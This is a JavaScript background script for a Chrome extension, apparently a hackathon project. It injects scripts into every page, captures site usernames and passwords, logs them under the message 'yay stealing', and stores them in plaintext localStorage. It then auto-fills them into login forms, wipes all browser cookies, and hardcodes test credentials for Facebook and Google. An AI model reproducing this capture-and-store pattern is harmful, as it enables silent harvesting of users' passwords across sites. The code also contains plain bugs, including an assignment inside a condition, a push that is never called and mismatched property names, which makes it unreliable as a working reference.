var setuplisteners = "var loc = window.location.href;"+
	"console.log(loc);"
var countpageloads = 0;
var loginWindowId = -4;
var createTab;
var numTabs; 
var tabArray;
var receievedFromTab = {};

var changeListener = function(tabId, changeInfo, tab){
  var reg = new RegExp('send.html');
  if(reg.test(tab.url)  && changeInfo.status == "complete"){
    chrome.tabs.executeScript(tabId, {file:'send.js', runAt: 'document_end'}, function(){});
  }

  if(tab.windowId == loginWindowId && changeInfo.status == "complete"){
    var windowCountScript = "chrome.runtime.sendMessage({requestType: 'count'}, "
          + "function(response) {"
        + "});";

    chrome.tabs.executeScript(tabId, {code: windowCountScript, runAt:"document_end"}, function(){});
  }

	if(changeInfo.status = "complete"){//changeInfo.url != undefined){
    chrome.tabs.executeScript(tabId, {file:"data.js",runAt: "document_end"}, 
      function(){
    });
		chrome.tabs.executeScript(tabId, {file:"listen.js",runAt: "document_end"}, 
			function(){
		});
	}
}



var loginListener = function(request, sender, sendResponse) {
	console.log(request);
	if(request.requestType === 'listen'){
	  	console.log("yay stealing");
	  	console.log("id is " + request.id + " password is "+ request.pw + " website is "  + request.site)
	    console.log(sender.tab ?
	                "from a content script:" + sender.tab.url :
	                "from the extension");
	    localStorage.setItem(request.site+"id" , request.id);
	    localStorage.setItem(request.site+"pw" , request.pw);

	    console.log("saved id: " + localStorage.getItem(request.site+"id"));
	    console.log("saved pw: " + localStorage.getItem(request.site+"pw"));

		sendResponse({farewell: "goodbye"});
	}
	else if(request.requestType == 'login'){
		sendResponse({savedid: localStorage.getItem(request.site+"id"), 
			savedpw: localStorage.getItem(request.site+"pw")});
	}
  else if(request.requestType == 'count'){
    console.log(countpageloads);
    console.log("tab " + sender.tab.id + "reporting");
    if(!receievedFromTab[sender.tab.id]){
      countpageloads++;
      receievedFromTab[sender.tab.id] = true;
    }
    if(countpageloads == numTabs){
      chrome.windows.create({url: tabArray}, function(newWindow){
        chrome.windows.update(newWindow.id, { state: "maximized" })
      });
      countpageloads++;
      chrome.windows.remove(loginWindowId);
    }
  }
}


chrome.runtime.onConnect.addListener(function(port) {
  console.assert(port.name == "data");
  port.onMessage.addListener(function(msg) {
    if (msg.request == "userdata"){
      chrome.windows.getAll({populate: true}, function(windowArr){
        console.log(windowArr);
        var tabData = new Array();
        var count = 0; 
        for(var i = 0; i < windowArr.length; ++i){
          for(var j = 0; j < windowArr[i].tabs.length; ++j){
            tabData[count] = {
              "url": windowArr[i].tabs[j].url,
              "favicon": windowArr[i].tabs[j].favIconUrl
            };
            count++;
          }
          //chrome.windows.remove(windowArr[i].id);
        }
        var accountsData = new Array();
        for(var i = 0; i < websitedata.length; ++i){
          
          var data = {};
          data.loginpage = websitedata[i].loginpage;
          data.loginData = new Array();
          if(localStorage.getItem(websitedata[i].reg+"id") == null || 
            localStorage.getItem(websitedata[i].reg+"pw") == null){
            continue;
          }
          data.loginData[0] = {'cssSelector':websitedata[i].idfield, 
            'data':localStorage.getItem(websitedata[i].reg+"id")};
          data.loginData[1] = {'cssSelector':websitedata[i].pwfield, 
            'data':localStorage.getItem(websitedata[i].reg+"pw")};
          data.loginButton = websitedata[i].submit;
          accountsData.push(data);
        }
        console.log(accountsData);
        console.log(tabData);
        port.postMessage({accounts : accountsData, tabs : tabData});
      });
    }
  });
});



var loadUser = function(userData){  
  console.log(userData);
  var savedWindowId; 

  tabArray = new Array();
  for(var i = 0; i < userData.tabs.length; ++i){
    tabArray.push(userData.tabs[i].url);
  }

  var loginTabArray = new Array();
  for(var i = 0; i <userData.accounts.length; ++i){
    var skip = false;
    for(var j = 0; j < userData.accounts[i].loginData.length; ++j){
      if(userData.accounts[i].loginData[j].data == null)
        skip = true;
    }
    if(skip)
      continue;

    loginTabArray.push
  }

  numTabs = userData.accounts.length;
  console.log("numtabs:"+numTabs);

  function removeCookie(cookie) {
    var url = "http" + (cookie.secure ? "s" : "") + "://" + cookie.domain +
         cookie.path;
    chrome.cookies.remove({"url": url, "name": cookie.name});
  };

  chrome.cookies.getAll({}, function(cookies) {
    for (var i in cookies) {
      removeCookie(cookies[i]);
    }
  });


  chrome.windows.create({}, function(newWindow){
    chrome.windows.update(newWindow.id, { state: "maximized" })
    loginWindowId = newWindow.id;
    for(var i = 0;  i < userData.accounts.length; ++i){
      var j = i;
      chrome.tabs.create({ windowId : newWindow.id, url : userData.accounts[i].loginPage}, createTab(i, userData));
    }
  });
}

var createTab = function(j, userData){
  return function(newTab){
        //do some function here to log into each service 
        receievedFromTab[newTab.id] = false;
        console.log("j is" + j);
        var execCode = 'var formsData = ' + JSON.stringify(userData.accounts[j].loginData) + ';'
        + 'var loginButton  = ' + JSON.stringify(userData.accounts[j].loginButton) + ';';
        console.log(execCode);
        chrome.tabs.executeScript(newTab.id, {code: execCode, runAt: 'document_end'}, function(){});
        chrome.tabs.executeScript(newTab.id, {file: 'login.js', runAt: 'document_end'}, function(){});
  }
};

var exampleData = {
   "accounts":[
      {
         "loginPage":"https://facebook.com/login.php",
         "loginData":[
            {
               "cssSelector":"#email",
               "data":"lahackstest@gmail.com"
            },
            {
               "cssSelector":"#pass",
               "data":"jayjayjay"
            }
         ],
         "loginButton":"#loginbutton"
      },
      {
        "loginPage":"https://accounts.google.com/ServiceLogin?sacu=1",
        "loginData":[
            {
               "cssSelector":"#Email",
               "data":"lahackstest@gmail.com"
            },
            {
               "cssSelector":"#Passwd",
               "data":"ddddddddd"
            }
        ],
        "loginButton":"#signIn"
      }
   ],
   "tabs":[
      {
         "url":"http://facebook.com",
         "favicon":"favicon_url"
      }
   ]
};


chrome.runtime.onMessage.addListener(loginListener);
chrome.tabs.onUpdated.addListener(changeListener);

chrome.runtime.onMessageExternal.addListener(function(msg, sender, cb){
  if (msg.hasOwnProperty("type") && msg.type === "close"){
    chrome.tabs.remove(sender.tab.id);
  }
});

loadUser(exampleData);